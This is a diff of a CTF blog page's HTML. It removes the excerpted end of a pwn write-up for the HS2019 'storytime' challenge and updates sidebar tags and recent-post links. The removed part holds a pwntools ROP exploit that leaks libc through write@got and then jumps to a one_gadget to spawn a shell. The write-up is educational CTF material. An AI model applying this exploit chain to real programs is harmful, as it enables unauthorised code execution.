class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x38</span>		<span class="comment"># 填充到ret address</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">1</span>) 	<span class="comment"># write(1, write@got, xxx)   第三个参数因为本身就大于write地址长度，可以不管</span></span><br><span class="line">payload += p64(rsi_r15_ret) + p64(belf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(belf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(main)		<span class="comment"># 跳转回main</span></span><br><span class="line">sla(<span class="string">b&#x27;story:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 获取libc base</span></span><br><span class="line">libc_base = ga() - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x38</span> </span><br><span class="line">payload += p64(libc_base + gadgets[<span class="number">0</span>]) <span class="comment"># 跳转执行gadgets</span></span><br><span class="line">sla(<span class="string">b&#x27;story:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/08/19/HS2019-storytime-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -644,7 +656,7 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/CVE/">CVE<span>5</span></a></li>
+			<li><a href="/categories/CVE/">CVE<span>6</span></a></li>
 		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
@@ -656,7 +668,7 @@
 		
 			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
 		
-			<li><a href="/categories/web-learning/">web-learning<span>5</span></a></li>
+			<li><a href="/categories/web-learning/">web-learning<span>6</span></a></li>
 		
 			<li><a href="/categories/web-wp/">web-wp<span>49</span></a></li>
 		
@@ -669,45 +681,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+			<li><a href="/tags/upload/">upload<span>4</span></a></li>
 		
-			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
-		
-			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
-		
-			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
-		
-			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
-		
-			<li><a href="/tags/nssctf/">nssctf<span>54</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>10</span></a></li>
-		
-			<li><a href="/tags/afr/">afr<span>2</span></a></li>
-		
-			<li><a href="/tags/HCTF2018/">HCTF2018<span>1</span></a></li>
-		
-			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
-		
-			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
-		
-			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
+			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
 		
 			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
 		
+			<li><a href="/tags/dcquals2019/">dcquals2019<span>1</span></a></li>
+		
+			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
+		
+			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
+		
+			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
+		
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
+		
+			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
+		
+			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
+		
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
+		
+			<li><a href="/tags/swampctf2019/">swampctf2019<span>1</span></a></li>
+		
+			<li><a href="/tags/partial-overwrite/">partial overwrite<span>1</span></a></li>
+		
 			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
 		
-			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
+			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
 		
-			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
+			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
 		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
 		
-			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+			<li><a href="/tags/off-by-one/">off_by_one<span>1</span></a></li>
 		
-			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
-		
-			<li><a href="/tags/SSTI/">SSTI<span>5</span></a></li>
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>113</span></a></li>
@@ -723,6 +735,14 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/12/02/JAVA反序列化CC1/" ><i class="fa fa-file-o"></i>JAVA反序列化CC1</a>
+      </li>
+    
+      <li>
+        <a href="/2023/11/24/xxe/" ><i class="fa fa-file-o"></i>xxe</a>
+      </li>
+    
+      <li>
         <a href="/2023/11/20/CVE-2018-1259复现/" ><i class="fa fa-file-o"></i>CVE-2018-1259复现</a>
       </li>
     
@@ -732,14 +752,6 @@
     
       <li>
         <a href="/2023/11/07/Backdoorctf-funsignals-wp/" ><i class="fa fa-file-o"></i>Backdoorctf-funsignals-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/25/HDCTF2023-YamiYami-wp/" ><i class="fa fa-file-o"></i>HDCTF2023-YamiYami-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-反方向的钟-wp</a>
       </li>
     
   </ul>
